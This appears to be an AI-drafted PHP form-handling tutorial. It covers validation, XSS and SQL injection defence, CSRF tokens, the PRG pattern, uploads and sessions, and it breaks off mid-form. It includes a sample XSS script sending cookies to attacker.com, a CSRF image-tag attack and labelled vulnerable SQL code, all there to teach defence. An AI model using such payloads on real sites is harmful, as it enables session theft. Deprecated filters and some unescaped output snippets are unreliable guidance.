### **Overview**

Basic form handling introduces you to the core mechanics of how browsers send data to the server and how PHP receives, validates, sanitizes, and processes that data. This step marks your transition from static pages to dynamic, interactive applications. Understanding the request lifecycle, security considerations, and proper handling of user input prepares you for building authentication systems, dashboards, APIs, routing layers, and full MVC frameworks. Mastery here forms the backbone of all modern web development in PHP.

### **Topics to Learn — Basic Form Handling**

|**Topic**|**Improved Brief Description (25+ Words)**|
|---|---|
|**[[Basic Form Handling.spl]]**|Introduces the journey of user-submitted data through HTML forms into PHP using `$_GET`, `$_POST`, and superglobals. Teaches fundamentals of capturing, validating, sanitizing, and responding to input, forming the basis for secure and structured server-side workflows.|
|**[[GET vs POST.spl]]**|Understanding the difference between URL-exposed GET requests and secure POST submissions is essential for designing safe forms, search interfaces, pagination tools, and workflows requiring protected data or state changes.|
|**[[Superglobals.spl]]**|Superglobals like `$_REQUEST`, `$_SERVER`, `$_COOKIE`, and `$_FILES` provide direct access to environment data. Mastering these prepares you for routing, headers, content negotiation, and advanced request handling.|
|**[[Input Validation.spl]]**|Validation ensures incoming values meet expected formats before processing. It prevents malformed data, ensures system stability, and prepares you for form rules, server-side checks, and framework-level validators.|
|**[[Input Sanitization.spl]]**|Sanitization removes dangerous or unwanted characters to prevent injection attacks. Functions like `filter_input` and `htmlspecialchars` form the core of clean, safe, user-supplied data handling.|
|**[[Security Basics (XSS & Injection).spl]]**|Introduces essential security practices such as escaping output, validating input, filtering dangerous characters, and preventing XSS or injection—crucial before working with sessions, databases, or file uploads.|
|**[[Working with $_FILES.spl]]**|File uploads introduce multipart requests and server file handling. Understanding validation, size limits, storage paths, and MIME-type checks is crucial for building safe upload workflows.|
|**[[Form State & Sticky Inputs.spl]]**|Sticky forms help preserve user input after errors, improving UX. This topic teaches how to repopulate fields securely and gracefully handle validation failures.|
|**[[Redirects & PRG Pattern.spl]]**|The Post/Redirect/Get pattern avoids double submissions and improves user experience. Understanding redirects prepares you for building clean workflows and structured navigation flows.|
|**[[Sessions Introduction.spl]]**|Sessions maintain state across page loads. Understanding how to begin and use sessions after form processing is essential for logins, dashboards, carts, and persistent experiences.|
|**[[CSRF Protection.spl]]**|Teaches how to generate, store, and validate CSRF tokens to prevent cross-site request forgery attacks—an essential security layer before working with authentication systems.|
|**[[Basic Routing Concepts.spl]]**|Routing organizes form endpoints cleanly. Learning how URLs map to scripts prepares you for modern MVC frameworks and structured application architecture.|
|**[[Error Handling & Feedback.spl]]**|Displaying validation errors, success messages, and user-friendly feedback teaches how to communicate clearly and maintain consistent UX during form interactions.|
|**[[Best Practices for Form Handling.spl]]**|Encourages using server-side validation, sanitization, CSRF tokens, prepared statements, and consistent response structures to ensure secure, maintainable, and scalable form workflows.|

---
I'll create a comprehensive research paper on Basic Form Handling in PHP. Let me start by conducting thorough research on this topic.Let me search for more information about CSRF protection, PRG pattern, and form validation best practices.Let me search for more information about PRG pattern and file uploads.Perfect! I now have comprehensive research on PHP form handling. Let me create the research paper.

---

# Mastering Basic Form Handling in PHP: A Comprehensive Analysis of User Input Processing, Security Practices, and the Foundation of Interactive Web Applications

**Abstract**

Form handling constitutes the fundamental bridge between user interaction and server-side processing in web applications. This research paper provides an exhaustive examination of PHP form handling—from capturing user input through superglobals ($_GET, $_POST, $_FILES) to implementing robust validation, sanitization, and security measures including XSS prevention, CSRF protection, and the Post-Redirect-Get (PRG) pattern. Through detailed analysis of the request lifecycle, security vulnerabilities, and best practices, this paper demonstrates how mastering form handling establishes the foundation for building authentication systems, APIs, and full-stack PHP applications. The analysis includes practical implementations of sticky forms, file uploads, session management, and error handling, providing developers with comprehensive guidance for creating secure, user-friendly form-based interactions in modern web development.

## 1. Introduction

### 1.1 The Transition from Static to Dynamic Web Applications

Form handling represents the pivotal moment when PHP developers transition from static HTML pages to dynamic, interactive applications. Every login system, user registration, search interface, comment section, and e-commerce checkout begins with understanding how browsers transmit data to servers and how PHP receives, processes, and responds to that data.

### 1.2 The Request Lifecycle

The Hypertext Transfer Protocol (HTTP) was developed as a protocol to serve the transmission of documents, and works as an intermediary between internet browsers and web servers. Understanding this request-response cycle is essential:

1. User fills HTML form
2. Browser serializes data
3. HTTP request sent to server
4. PHP receives and processes data
5. Server generates response
6. Browser displays result

### 1.3 Research Objectives

This paper examines PHP form handling through multiple dimensions:

- **Superglobals**: Understanding $_GET, $_POST, $_REQUEST, $_SERVER, $_FILES
- **Security**: Preventing XSS, SQL injection, and CSRF attacks
- **Validation and Sanitization**: Ensuring data integrity and safety
- **User Experience**: Implementing sticky forms and proper error feedback
- **Best Practices**: Establishing patterns for maintainable, secure applications

### 1.4 Significance for Modern Web Development

In PHP 8, Superglobals still play an essential role in handling input and session data. However, they must be used carefully to avoid security risks such as XSS, SQL injection, and session hijacking. Proper form handling forms the backbone of authentication systems, dashboards, APIs, and full MVC frameworks.

## 2. Understanding Superglobals

### 2.1 What Are Superglobals?

PHP superglobals are built-in variables that are always available in all scopes. They provide access to various types of data like form inputs, server info, and session data. Superglobals are PHP's attempt at helping you determine where a particular value comes from.

**Key superglobals:**

- `$_GET`: URL parameters
- `$_POST`: Form data submitted via POST
- `$_REQUEST`: Combined GET, POST, and COOKIE data
- `$_SERVER`: Server and execution environment information
- `$_FILES`: Uploaded files
- `$_COOKIE`: HTTP cookies
- `$_SESSION`: Session variables
- `$_ENV`: Environment variables

### 2.2 The $_GET Superglobal

The $_GET superglobal collects data sent to the script via URL parameters:

```php
// URL: search.php?query=php&category=tutorials

$searchQuery = $_GET['query'] ?? '';
$category = $_GET['category'] ?? 'all';

echo "Searching for: " . htmlspecialchars($searchQuery);
// Output: Searching for: php
```

**Characteristics:**

- Data visible in URL
- Limited to ~8192 characters
- Bookmarkable and shareable
- Cached by browsers
- Not suitable for sensitive data

### 2.3 The $_POST Superglobal

The $_POST superglobal is used to collect form data after submitting a form with the POST method. This method is more secure than GET as the data is sent in the body of the HTTP request, not in the URL:

```php
// HTML Form
<form method="post" action="process.php">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>

// process.php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Process login
}
?>
```

**Characteristics:**

- Data sent in request body
- Data submitted via POST is not limited in size (unlike GET)
- Not visible in URL
- Not cached
- Cannot be bookmarked
- Preferred for sensitive data

### 2.4 The $_REQUEST Superglobal

The $_REQUEST superglobal is a combination of $_GET, $_POST, and $_COOKIE. It contains data from all three sources. However, it is advisable to use $_GET, $_POST, or $_COOKIE directly for better control and security over the data:

```php
// Can retrieve from GET or POST
$color = $_REQUEST['color'] ?? 'white';

// Better practice - explicit source
$color = $_GET['color'] ?? $_POST['color'] ?? 'white';
```

### 2.5 The $_SERVER Superglobal

The $_SERVER superglobal contains information about the server environment, request headers, and other system information:

```php
// Common $_SERVER variables
$requestMethod = $_SERVER['REQUEST_METHOD']; // GET, POST, etc.
$scriptName = $_SERVER['PHP_SELF'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ipAddress = $_SERVER['REMOTE_ADDR'];
$host = $_SERVER['HTTP_HOST'];
$protocol = $_SERVER['SERVER_PROTOCOL'];
```

### 2.6 Security with Superglobals

Superglobals are PHP's attempt at helping you determine where a particular value comes from. This will prevent the ability for any user-submitted variable to be injected into your PHP code and can reduce the amount of variable poisoning a potential attacker may inflict.

**Critical security principle:** In terms of the other variables it's good practice to not write to any of $_GET, $_POST, $_REQUEST, $_SERVER or $_COOKIE. Always treat superglobals as read-only to maintain clear data flow and prevent unexpected behavior.

## 3. GET vs POST: Choosing the Right Method

### 3.1 The GET Method

**Appropriate use cases:**

- Search forms
- Filtering and sorting
- Pagination
- Sharing/bookmarking URLs
- Idempotent operations (no side effects)

**Example - Search interface:**

```php
<form method="get" action="search.php">
    <input type="text" name="q" placeholder="Search...">
    <select name="sort">
        <option value="relevance">Relevance</option>
        <option value="date">Date</option>
    </select>
    <button type="submit">Search</button>
</form>

<?php
// search.php
$query = filter_input(INPUT_GET, 'q', FILTER_SANITIZE_STRING);
$sort = filter_input(INPUT_GET, 'sort', FILTER_SANITIZE_STRING);

// User can bookmark: search.php?q=php&sort=date
?>
```

### 3.2 The POST Method

**Appropriate use cases:**

- Login forms
- User registration
- Data creation/modification
- Sensitive information
- Large data submissions
- File uploads

**Example - Login form:**

```php
<form method="post" action="login.php">
    <input type="email" name="email" required>
    <input type="password" name="password" required>
    <button type="submit">Login</button>
</form>

<?php
// login.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
    $password = $_POST['password'] ?? '';
    
    // Authenticate user
}
?>
```

### 3.3 Security Comparison

The information traveling in the body of the HTTP request can be intercepted by bad agents. The best practice, then, is to make these transmissions using encryption, via the HTTPS protocol, so it makes harder to them read this information.

**GET security concerns:**

- Credentials visible in URL
- Logged in browser history
- Cached by proxies
- Visible in server logs
- Can be leaked via Referer header

**POST advantages:**

- Data not in URL
- Not cached by default
- Not logged in browser history
- Still requires HTTPS for transmission security

## 4. Input Validation and Sanitization

### 4.1 The Distinction

**Validation**: Checking if data meets expected format/rules **Sanitization**: Removing/escaping dangerous characters

Both are essential and complementary:

```php
// Validation
$age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT);
if ($age === false || $age < 18) {
    $errors[] = "Must be 18 or older";
}

// Sanitization
$name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
```

### 4.2 Using filter_input()

filter_input() is used to safely access input data from superglobals, applying filters to sanitize or validate the input before using it:

```php
// Validate integer
$userId = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($userId === false) {
    die('Invalid user ID');
}

// Validate email
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
if ($email === false) {
    $errors['email'] = 'Invalid email address';
}

// Sanitize string
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);

// Validate with options
$age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT, [
    'options' => ['min_range' => 18, 'max_range' => 120]
]);
```

### 4.3 Common Validation Patterns

```php
class Validator {
    private $errors = [];
    
    public function validateEmail($email, $fieldName = 'email') {
        if (empty($email)) {
            $this->errors[$fieldName] = 'Email is required';
            return false;
        }
        
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this->errors[$fieldName] = 'Invalid email format';
            return false;
        }
        
        return true;
    }
    
    public function validatePassword($password, $fieldName = 'password') {
        if (empty($password)) {
            $this->errors[$fieldName] = 'Password is required';
            return false;
        }
        
        if (strlen($password) < 8) {
            $this->errors[$fieldName] = 'Password must be at least 8 characters';
            return false;
        }
        
        return true;
    }
    
    public function getErrors() {
        return $this->errors;
    }
}
```

### 4.4 Sanitization for Output

Always sanitize data before displaying it to prevent XSS attacks:

```php
// Escape HTML
$safeName = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
echo "<h1>Welcome, $safeName</h1>";

// For HTML attributes
$safeValue = htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
echo '<input type="text" value="' . $safeValue . '">';

// For JavaScript context
$safeJson = json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP);
echo "<script>var userData = $safeJson;</script>";

// For URLs
$safeUrl = urlencode($userInput);
echo '<a href="profile.php?user=' . $safeUrl . '">Profile</a>';
```

## 5. Security Fundamentals: XSS and Injection Prevention

### 5.1 Cross-Site Scripting (XSS)

XSS occurs when attackers inject malicious scripts into web pages viewed by other users:

```php
// VULNERABLE CODE - Never do this!
$comment = $_POST['comment'];
echo "<div>$comment</div>"; // Can execute malicious JavaScript

// SAFE CODE
$comment = $_POST['comment'];
echo "<div>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";
```

**Example XSS attack:**

```html
<!-- Attacker submits -->
<script>
    document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>
```

**Defense strategies:**

1. Always escape output with `htmlspecialchars()`
2. Use Content Security Policy headers
3. Validate input format
4. Use modern templating engines with auto-escaping

### 5.2 SQL Injection Prevention

Use prepared statements with parameterized queries to prevent SQL injection attacks:

```php
// VULNERABLE - Never concatenate user input!
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query); // Can be exploited

// SAFE - Use prepared statements
$username = $_POST['username'];
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

### 5.3 Input Validation as Defense

```php
function validateAndSanitize($input, $type = 'string') {
    switch ($type) {
        case 'email':
            return filter_var($input, FILTER_VALIDATE_EMAIL);
            
        case 'int':
            return filter_var($input, FILTER_VALIDATE_INT);
            
        case 'url':
            return filter_var($input, FILTER_VALIDATE_URL);
            
        case 'string':
        default:
            // Remove HTML tags, encode special chars
            $cleaned = strip_tags($input);
            return htmlspecialchars($cleaned, ENT_QUOTES, 'UTF-8');
    }
}
```

## 6. CSRF Protection: Preventing Forged Requests

### 6.1 Understanding CSRF Attacks

CSRF is an Internet exploit that involves a trusted website user issuing unauthorized commands. For example, if an authenticated user comes across a malicious script like an image tag pointing to a delete endpoint, it inadvertently causes data to be deleted.

**Attack scenario:**

```html
<!-- Malicious website -->
<img src="http://yourbank.com/transfer?to=attacker&amount=1000">

<!-- If user is logged into yourbank.com, request executes! -->
```

### 6.2 Generating CSRF Tokens

CSRF tokens should be generated on the server-side using a secure random method like bin2hex(random_bytes(32)):

```php
// Generate secure token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

**Security warning:** md5(uniqid(rand(), TRUE)) is not a secure way to generate random numbers. Always use `random_bytes()` for cryptographic security.

### 6.3 Including Tokens in Forms

Include the token as a hidden field in forms:

```php
<form method="post" action="process.php">
    <input type="hidden" name="csrf_token" 
           value="<?php echo $_SESSION['csrf_token']; ?>">
    
    <input type="text" name="username">
    <button type="submit">Submit</button>
</form>
```

### 6.4 Validating Tokens

Use hash_equals() to securely compare tokens, protecting against timing attacks:

```php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $submittedToken = $_POST['csrf_token'] ?? '';
    
    if (!isset($_SESSION['csrf_token']) || 
        !hash_equals($_SESSION['csrf_token'], $submittedToken)) {
        die('CSRF token validation failed');
    }
    
    // Token valid - process form
}
```

### 6.5 CSRF Best Practices

CSRF tokens should be unpredictable, use a large random value generated by a secure method, and should be generated only once per user session or each request.

**Recommendations:**

1. Generate tokens with `random_bytes()`
2. Store in session, not cookies
3. Use `hash_equals()` for comparison
4. Always transmit CSRF tokens over HTTPS to prevent interception by attackers
5. Never include CSRF tokens in URLs, as they can be logged, cached, or exposed to third parties
6. Regenerate after critical actions (login, password change)

## 7. The Post-Redirect-Get (PRG) Pattern

### 7.1 The Double Submit Problem

When a form is submitted, you validate the data, update the database, and display the output. However, if you click the Refresh button of the browser after the form is submitted, the browser will submit the form again. This leads to:

- Duplicate database entries
- Double charges in payment systems
- Repeated emails/notifications

### 7.2 How PRG Solves the Problem

Post/Redirect/Get (PRG) is a design pattern in web development that can prevent duplicate form submissions, and provides a more intuitive user interface.

**PRG flow:**

1. User submits form via POST
2. Server processes data
3. Server sends 303 redirect
4. Browser makes GET request
5. Server returns result page

**Diagram:**

```
[Form] --POST--> [Process] --303 Redirect--> [Result]
                                               |
                                         GET <-|
```

### 7.3 Implementing PRG

The server redirects the browser using header() with HTTP 303 status code:

```php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validate and process form
    $amount = filter_input(INPUT_POST, 'amount', FILTER_VALIDATE_FLOAT);
    
    if ($amount) {
        // Process payment
        $success = processPayment($amount);
        
        // Store result in session
        $_SESSION['payment_success'] = $success;
        $_SESSION['amount'] = $amount;
        
        // Redirect with 303 status
        header('Location: confirmation.php', true, 303);
        exit;
    }
}

// confirmation.php
session_start();

if (isset($_SESSION['payment_success'])) {
    $success = $_SESSION['payment_success'];
    $amount = $_SESSION['amount'];
    
    // Display result
    if ($success) {
        echo "Payment of $$amount processed successfully!";
    }
    
    // Clear session data
    unset($_SESSION['payment_success'], $_SESSION['amount']);
}
```

### 7.4 PRG with Error Handling

```php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $errors = [];
    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
    
    if (!$email) {
        $errors['email'] = 'Invalid email';
    }
    
    if (empty($errors)) {
        // Success - store and redirect
        $_SESSION['success'] = 'Registration successful!';
        header('Location: ' . $_SERVER['PHP_SELF'], true, 303);
        exit;
    } else {
        // Errors - store for display
        $_SESSION['errors'] = $errors;
        $_SESSION['old_input'] = $_POST;
        header('Location: ' . $_SERVER['PHP_SELF'], true, 303);
        exit;
    }
}

// Display form with errors
$errors = $_SESSION['errors'] ?? [];
$oldInput = $_SESSION['old_input'] ?? [];

unset($_SESSION['errors'], $_SESSION['old_input']);
```

### 7.5 Limitations of PRG

The PRG pattern cannot address every scenario of duplicate form submission. For example, if a web user refreshes before the initial submission completes, possibly because of server lag, a duplicate POST occurs in certain user agents.

**Additional protections:**

- CSRF tokens (prevent forged submissions)
- Database unique constraints
- Idempotency keys for critical operations
- Client-side submit button disabling

## 8. Working with File Uploads

### 8.1 The $_FILES Superglobal

$_FILES handles file uploads. The form must have enctype="multipart/form-data":

```php
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload">
    <button type="submit">Upload</button>
</form>
```

**$_FILES structure:**

```php
$_FILES['fileToUpload'] = [
    'name' => 'document.pdf',        // Original filename
    'type' => 'application/pdf',     // MIME type
    'tmp_name' => '/tmp/phpXXXXXX',  // Temporary location
    'error' => 0,                    // Error code (0 = success)
    'size' => 245760                 // Size in bytes
];
```

### 8.2 Secure File Upload Handling

```php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['fileToUpload'])) {
    $file = $_FILES['fileToUpload'];
    $errors = [];
    
    // Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        $errors[] = 'Upload failed with error code: ' . $file['error'];
    }
    
    // Validate file size (5MB max)
    $maxSize = 5 * 1024 * 1024;
    if ($file['size'] > $maxSize) {
        $errors[] = 'File too large. Maximum size is 5MB';
    }
    
    // Validate file type
    $allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    if (!in_array($mimeType, $allowedTypes)) {
        $errors[] = 'Invalid file type';
    }
    
    // Validate file extension
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'pdf'];
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($extension, $allowedExtensions)) {
        $errors[] = 'Invalid file extension';
    }
    
    if (empty($errors)) {
        // Generate safe filename
        $newFilename = bin2hex(random_bytes(16)) . '.' . $extension;
        $uploadPath = '/var/www/uploads/' . $newFilename;
        
        // Move file
        if (move_uploaded_file($file['tmp_name'], $uploadPath)) {
            echo "File uploaded successfully: $newFilename";
        } else {
            $errors[] = 'Failed to move uploaded file';
        }
    }
    
    if (!empty($errors)) {
        foreach ($errors as $error) {
            echo "<p>Error: $error</p>";
        }
    }
}
```

### 8.3 File Upload Security Considerations

Always validate file types and sizes for security. You should validate uploaded files to prevent security risks:

**Critical security measures:**

1. Validate MIME type using `finfo_file()`, not `$_FILES['type']` (client-controlled)
2. Validate file extension
3. Enforce file size limits
4. Store uploads outside web root
5. Generate random filenames
6. Never execute uploaded files
7. Scan for malware if possible
8. Set proper file permissions

**Example: Validating image dimensions:**

```php
if (in_array($mimeType, ['image/jpeg', 'image/png'])) {
    list($width, $height) = getimagesize($file['tmp_name']);
    
    if ($width > 2000 || $height > 2000) {
        $errors[] = 'Image dimensions too large';
    }
}
```

## 9. Form State and Sticky Inputs

### 9.1 Preserving User Input After Errors

Sticky forms improve user experience by repopulating fields after validation errors:

```php
<?php
session_start();

$errors = $_SESSION['errors'] ?? [];
$old = $_SESSION['old_input'] ?? [];

// Clear after retrieving
unset($_SESSION['errors'], $_SESSION['old_input']);
?>

<form method="post" action="process.php">
    <div>
        <label>Username:</label>
        <input type="text" name="username" 
               value="<?= htmlspecialchars($old['username'] ?? '') ?>">
        <?php if (isset($errors['username'])): ?>
            <span class="error"><?= $errors['username'] ?></span>
        <?php endif; ?>
    </div>
    
    <div>
        <label>Email:</label>
        <input type="email" name="email" 
               value="<?= htmlspecialchars($old['email'] ?? '') ?>">
        <?php if (isset($errors['email'])): ?>
            <span class="error"><?= $errors['email'] ?></span>
        <?php endif; ?>
    </div>
    
    <button type="submit">Register</button>
</form>
```

### 9.2 Helper Functions for Sticky Forms

```php
function old($field, $default = '') {
    return $_SESSION['old_input'][$field] ?? $default;
}

function error($field) {
    return $_SESSION['errors'][$field] ?? null;
}

function hasError($field) {
    return isset($_SESSION['errors'][$field]);
}

// Usage in template
<input type="text" name="username" 
       value="<?= htmlspecialchars(old('username')) ?>"
       class="<?= hasError('username') ? 'error' : '' ?>">
<?php if ($msg = error('username')): ?>
    <span class="error-message"><?= $msg ?></span>
<?php endif; ?>
```

### 9.3 Handling Select and Radio Inputs

```php
<select name="country">
    <option value="">Select Country</option>
    <option value="US" <?= old('country') === 'US' ? 'selected' : '' ?>>
        United States
    </option>
    <option value="UK" <?= old('country') === 'UK' ? 'selected' : '' ?>>
        United Kingdom
    </option>
</select>

<label>
    <input type="radio" name="gender" value="male" 
           <?= old('gender') === 'male' ? 'checked' : '' ?>>
    Male
</label>
<label>
    <input type="radio" name="gender" value="female" 
           <?= old('gender') === 'female' ? 'checked' : '' ?>>
    Female
</label>
```

## 10. Sessions and State Management

### 10.1 Introduction to Sessions

Sessions maintain state across page loads, essential for:

- User authentication
- Shopping carts
- Multi-step forms
- Flash messages
- User preferences

**Basic session usage:**

```php
// Start session (must be before any output)
session_start();

// Store data
$_SESSION['user_id'] = 123;
$_SESSION['username'] = 'john_doe';

// Retrieve data
$userId = $_SESSION['user_id'] ?? null;

// Remove specific data
unset($_SESSION['user_id']);

// Destroy entire session
session_destroy();
```

### 10.2 Flash Messages with Sessions

```php
// Set flash message
function setFlash($key, $message) {
    $_SESSION['flash'][$key] = $message;
}

// Get and clear flash message
function getFlash($key) {
    $message = $_SESSION['flash'][$key] ?? null;
    unset($_SESSION['flash'][$key]);
    return $message;
}

// Usage
// After successful operation
setFlash('success', 'Account created successfully!');
header('Location: dashboard.php');
exit;

// On dashboard.php
if ($msg = getFlash('success')) {
    echo "<div class='alert success'>$msg</div>";
}
```

### 10.3 Session Security

```php
// Regenerate session ID after login
session_start();
if ($loginSuccessful) {
    session_regenerate_id(true);
    $_SESSION['user_id'] = $userId;
    $_SESSION['logged_in'] = time();
}

// Set secure session parameters
ini_set('session.cookie_httponly', 1);  // Prevent JavaScript access
ini_set('session.cookie_secure', 1);    // HTTPS only
ini_set('session.cookie_samesite', 'Strict'); // CSRF protection
ini_set('session.use_strict_mode', 1);  // Reject uninitialized IDs

// Session timeout
session_start();
$timeout = 1800; // 30 minutes

if (isset($_SESSION['last_activity']) && 
    (time() - $_SESSION['last_activity'] > $timeout)) {
    session_unset();
    session_destroy();
    header('Location: login.php');
    exit;
}

$_SESSION['last_activity'] = time();
```

## 11. Error Handling and User Feedback

### 11.1 Structured Error Display

```php
class FormHandler {
    private $errors = [];
    private $success = [];
    
    public function addError($field, $message) {
        $this->errors[$field][] = $message;
    }
    
    public function addSuccess($message) {
        $this->success[] = $message;
    }
    
    public function hasErrors() {
        return !empty($this->errors);
    }
    
    public function getErrors($field = null) {
        if ($field) {
            return $this->errors[$field] ?? [];
        }
        return $this->errors;
    }
    
    public function displayErrors() {
        if (empty($this->errors)) return '';
        
        $html = '<div class="errors"><ul>';
        foreach ($this->errors as $field => $messages) {
            foreach ($messages as $message) {
                $html .= '<li>' . htmlspecialchars($message) . '</li>';
            }
        }
        $html .= '</ul></div>';
        return $html;
```} }

````

### 11.2 User-Friendly Error Messages

```php
// Bad: Technical, unhelpful
$errors[] = "SQLSTATE[23000]: Integrity constraint violation";

// Good: User-friendly, actionable
$errors['email'] = "This email is already registered. Try logging in instead.";

// Example implementation
function validateRegistration($data) {
    $errors = [];
    
    if (empty($data['email'])) {
        $errors['email'] = 'Please enter your email address';
    } elseif (!filter_var($data['email'], FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Please enter a valid email address';
    } elseif (emailExists($data['email'])) {
        $errors['email'] = 'This email is already registered. <a href="login.php">Log in instead</a>';
    }
    
    if (empty($data['password'])) {
        $errors['password'] = 'Please choose a password';
    } elseif (strlen($data['password']) < 8) {
        $errors['password'] = 'Password must be at least 8 characters long';
    }
    
    return $errors;
}
````

## 12. Basic Routing Concepts

### 12.1 Single Entry Point Routing

```php
// .htaccess - Route all requests to index.php
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php [L,QSA]

// index.php
$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$requestMethod = $_SERVER['REQUEST_METHOD'];

switch ($requestUri) {
    case '/':
        require 'views/home.php';
        break;
        
    case '/users/create':
        if ($requestMethod === 'GET') {
            require 'views/users/create.php';
        } elseif ($requestMethod === 'POST') {
            require 'controllers/users/store.php';
        }
        break;
        
    case '/users/login':
        require 'controllers/auth/login.php';
        break;
        
    default:
        http_response_code(404);
        require 'views/404.php';
        break;
}
```

### 12.2 Basic Router Class

```php
class Router {
    private $routes = [];
    
    public function get($path, $callback) {
        $this->routes['GET'][$path] = $callback;
    }
    
    public function post($path, $callback) {
        $this->routes['POST'][$path] = $callback;
    }
    
    public function dispatch() {
        $method = $_SERVER['REQUEST_METHOD'];
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        
        if (isset($this->routes[$method][$path])) {
            $callback = $this->routes[$method][$path];
            return call_user_func($callback);
        }
        
        http_response_code(404);
        echo "404 Not Found";
    }
}

// Usage
$router = new Router();

$router->get('/', function() {
    require 'views/home.php';
});

$router->post('/users/create', function() {
    // Handle user creation
});

$router->dispatch();
```

## 13. Best Practices for Form Handling

### 13.1 Comprehensive Security Checklist

Security recommendations for PHP form handling include: always use prepared statements for database queries, implement CSRF protection on all forms, sanitize and validate all input data, use HTTPS to encrypt data transmission, implement proper session management, and set appropriate headers like Content Security Policy.

**Essential practices:**

1. **Always validate server-side** (never trust client validation alone)
2. **Use prepared statements** for database queries
3. **Implement CSRF protection** on all state-changing forms
4. **Sanitize output** with `htmlspecialchars()`
5. **Use HTTPS** for sensitive data transmission
6. **Implement rate limiting** to prevent abuse
7. **Log security events** (failed logins, validation failures)
8. **Use PRG pattern** to prevent double submissions

### 13.2 Complete Form Handling Example

```php
<?php
session_start();

// Security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');

// Generate CSRF token
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$errors = [];
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validate CSRF token
    if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
        die('CSRF validation failed');
    }
    
    // Validate input
    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
    $name = filter_input(INPUT_POST, 'name', FILTER_SANITIZE_STRING);
    $age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT, [
        'options' => ['min_range' => 18, 'max_range' => 120]
    ]);
    
    if (!$email) {
        $errors['email'] = 'Please provide a valid email address';
    }
    
    if (empty($name) || strlen($name) < 2) {
        $errors['name'] = 'Name must be at least 2 characters';
    }
    
    if ($age === false) {
        $errors['age'] = 'Please provide a valid age (18-120)';
    }
    
    // If no errors, process
    if (empty($errors)) {
        // Prepare database statement
        $stmt = $pdo->prepare(
            "INSERT INTO users (email, name, age) VALUES (?, ?, ?)"
        );
        
        if ($stmt->execute([$email, $name, $age])) {
            // Store success message
            $_SESSION['success'] = 'Registration successful!';
            
            // Redirect (PRG pattern)
            header('Location: ' . $_SERVER['PHP_SELF'], true, 303);
            exit;
        } else {
            $errors['general'] = 'Registration failed. Please try again.';
        }
    } else {
        // Store errors and input for redisplay
        $_SESSION['errors'] = $errors;
        $_SESSION['old_input'] = $_POST;
        header('Location: ' . $_SERVER['PHP_SELF'], true, 303);
        exit;
    }
}

// Retrieve and clear flash data
$errors = $_SESSION['errors'] ?? [];
$old = $_SESSION['old_input'] ?? [];
$success = $_SESSION['success'] ?? '';
unset($_SESSION['errors'], $_SESSION['old_input'], $_SESSION['success']);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Registration Form</title>
    <style>
        .error { color: red; }
        .success { color: green; }
        input.error { border-color: red; }
    </style>
</head>
<body>
    <?php if ($success): ?>
        <div class="success"><?= htmlspecialchars($success) ?></div>
    <?php endif; ?>
    
    <?php if (!empty($errors)): ?>
        <div class="error">
            <ul>
                <?php foreach ($errors as $error): ?>
                    <li><?= htmlspecialchars($error) ?></li>
                <?php endforeach; ?>
            </ul>
        </div>
    <?php endif; ?>
    
    <form method="post" action="<?= htmlspecialchars($_SERVER['PHP_SELF']) ?>">
        <input type="hidden" name="csrf_token" 
               value="<?= $_SESSION['csrf_token'] ?>">
        
        <div>
            <label>Name:</label>
            <input type="text" name="name" 
                   value="<?= htmlspecialchars($old['name'] ?? '') ?>"
                   class="<?= isset($errors['name']) ? 'error' : '' ?>"
                   required>
        </div>
        
        <div>
